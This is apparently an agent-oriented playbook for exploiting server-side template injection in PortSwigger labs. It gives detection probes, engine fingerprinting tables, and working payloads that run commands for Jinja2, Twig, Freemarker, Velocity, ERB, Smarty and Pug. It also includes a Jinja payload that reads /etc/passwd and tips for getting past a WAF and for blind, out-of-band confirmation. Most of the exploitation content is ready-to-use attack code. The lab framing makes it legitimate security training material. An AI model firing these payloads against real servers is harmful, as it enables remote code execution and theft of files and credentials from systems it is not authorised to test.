# Server-Side Template Injection (SSTI) Methodology
## Expert-Level Playbook (detect → fingerprint engine → RCE/file read)

> 7 PortSwigger labs. Never fire engine-specific payloads before fingerprinting.
> Use `ssti_probe` for the arithmetic/fingerprint sweep, then the engine-matched
> chain. Escalate to file read / command execution only when the lab requires it.

---

## Phase 1: Detection

### 1.1 Reflection surfaces
User input rendered by a template: names, greetings, email templates, error
pages, `?message=`, product descriptions, order confirmations, blog previews.

### 1.2 Polyglot + arithmetic probe
```
ssti_probe url="https://TARGET/?name=INJECT"
# manual:  ${7*7}  {{7*7}}  <%= 7*7 %>  #{7*7}  ${{7*7}}  {7*7}  a{*comment*}b
```
`49` (or template error) ⇒ SSTI. Literal `${7*7}` ⇒ not evaluated there.

---

## Phase 2: Fingerprint the engine

Use the classic decision probes:
```
{{7*'7'}}      → 7777777  (Jinja2/Twig)   |   49 (some)   |   error
${7*7}         → 49       (Java EL / Freemarker / Velocity / Smarty)
<%= 7*7 %>     → 49       (ERB / Ruby)
#{7*7}         → 49       (Ruby / Slim / Thymeleaf-ish)
{7*7}          → 49       (Tornado / Handlebars-ish)
```

| Response to `{{7*'7'}}` | Likely engine |
|-------------------------|---------------|
| `7777777` | Jinja2 (Python) or Twig (PHP) |
| `49` | Twig older / other |
| error | Freemarker / Velocity / EL |

Confirm with an engine-unique token (e.g. Twig `{{_self}}`, Jinja `{{config}}`,
Freemarker `${.version}`).

---

## Phase 3: Exploitation per engine

### 3.1 Jinja2 (Python)
```
{{ ''.__class__.__mro__[1].__subclasses__() }}                 # enumerate
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### 3.2 Twig (PHP)
```
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ ['id']|filter('system') }}
{{ attribute(_self.env,"getFilter",["system"]) }}
```

### 3.3 Freemarker (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id")}
```

### 3.4 Velocity (Java)
```
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

### 3.5 ERB / Ruby
```
<%= system("id") %>   |   <%= `id` %>   |   <%= IO.popen('id').read %>
```

### 3.6 Smarty (PHP)
```
{system('id')}   |   {php}system('id');{/php}
```

### 3.7 Handlebars / Node / Pug
```
# Handlebars: prototype-walk to require('child_process')
# Pug: #{root.process.mainModule.require('child_process').execSync('id')}
```

---

## Phase 4: Sub-variant tips

| Sub-variant | Move |
|-------------|------|
| Basic SSTI | detect `${7*7}`, run direct code exec |
| SSTI in an unknown context | try all polyglots; check error stack for engine |
| SSTI with docs | read the specific engine docs for the sandbox escape |
| Custom exploit (sandboxed) | walk object graph to reach `os`/`Runtime`/`system` |
| Blind SSTI | no output → time delay or OOB: `${T(java.lang...)}` sleep / DNS |
| SSTI → file read | Jinja `{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}` |

For blind labs, use `oob_get_domain`/`oob_poll` (engine HTTP/DNS gadget) or a
timing payload.

---

## Phase 5: Tooling

```
ssti_probe                # arithmetic + polyglot fingerprint sweep
http_request              # deliver engine-specific payloads
capture_baseline / diff_against_baseline   # confirm evaluation vs literal
oob_get_domain / oob_poll # blind SSTI confirmation
run_shell                 # tplmap/sstimap if deeper automation is needed
```

## Common Failure Modes & Solutions

| Problem | Solution |
|---------|----------|
| Payload printed literally | Wrong context/engine; re-run the polyglot sweep |
| Sandbox blocks direct exec | Walk the object graph (subclasses/globals) to reach the sink |
| No output (blind) | Use time-delay or OOB gadget |
| WAF strips `{{` | Try `${`, `#{`, `<%`, or encoded/split braces |
| Engine unknown | Trigger a template error and read the stack trace |

## Validation / Success Criteria
- [ ] Expression is evaluated server-side (not reflected literally).
- [ ] Engine fingerprinted before engine-specific payloads.
- [ ] Required impact (code exec / file read / OOB) achieved; control stays literal.
- [ ] Lab solved banner observed.
